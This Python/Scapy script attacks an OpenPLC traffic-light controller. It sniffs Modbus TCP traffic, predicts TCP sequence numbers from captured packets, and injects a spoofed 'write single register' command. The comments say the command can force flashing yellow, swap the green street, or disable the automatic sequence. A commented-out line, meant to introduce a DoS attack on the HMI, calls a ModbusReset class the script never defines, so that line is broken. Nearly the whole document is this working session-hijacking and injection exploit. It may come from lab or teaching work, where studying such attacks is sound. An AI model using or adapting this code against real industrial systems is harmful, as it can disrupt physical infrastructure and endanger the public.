from scapy.all import *

flag = 1
while flag:
	OPENPLC_FRAMES = sniff(iface='eth0', count=5, filter = 'dst host 172.16.192.10')
	READ_REGISTER_QUERY = OPENPLC_FRAMES[2] 
	READ_REGISTER_ACK = OPENPLC_FRAMES[4] 

	try:
		if "\x00\x01\x00\x00\x00\r\x01\x03\n" in READ_REGISTER_QUERY[Raw].load:  #this string should be customized to scan for the raw header of the 
			print("END OF COMMUNICATION LOOP (FINAL QUERY) DETECTED")	 #penultimate message in the communication sequence
			flag=0
	except:
		flag=1

print("PACKET CRAFTING TIME")
tcpdata = {
	'src': READ_REGISTER_ACK[IP].src,
	'dst': READ_REGISTER_ACK[IP].dst,
	'sport': READ_REGISTER_ACK[TCP].sport,
	'dport': READ_REGISTER_ACK[TCP].dport,
	'seq': READ_REGISTER_ACK[TCP].seq + 21, #these numbers aree subject to change, based off the offset within the communication with a known length of
	'ack': READ_REGISTER_ACK[TCP].ack + 12,	#the previous packet sent within the TCP stream
	'wnd': READ_REGISTER_ACK[TCP].window
	}

payload = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
	TCP(sport=tcpdata['dport'], dport=tcpdata['sport'], flags="PA",
	window=tcpdata['wnd'], seq=tcpdata['ack'], ack=tcpdata['seq'])

class ModbusTCP(Packet):
	name = "ModbusTcp"
	fields_desc = [ ShortField("Transaction Identifier", 1337), # Transaction ID is customized to show direct results, other variables are known goods
			ShortField("Protocol Identifier", 0),
			ShortField("Length", 6),
			ByteField("Unit Identifier", 1)
			]

class ModbusSet(Packet):
	name = "Modbus"
	fields_desc = [ XByteField("Function Code", 6), #REQUIRED TO WRITE TO SINGLE REGISTER, SEE FUNCTION CODES FOR MORE INFORMATION
			ShortField("Reference Number", 1), #Customizable to create different results (Flashing yellow, change from side to main street, disable auto sequence, etc.)
			ShortField("Data", 1)
			]


payload = payload/ModbusTCP()/ModbusSet()

print("INJECTION TIME")
send(payload, verbose=0, iface='eth0')

print("AND THAT\'S ALL FOLKS")
payload.display()

resetPayload = payload/ModbusTCP()/ModbusReset()
#send(resetPayload, verbose=0, iface='eth0') this should not be uncommented, but kept in final beta to introduce the idea of a DoS attack on the HMI
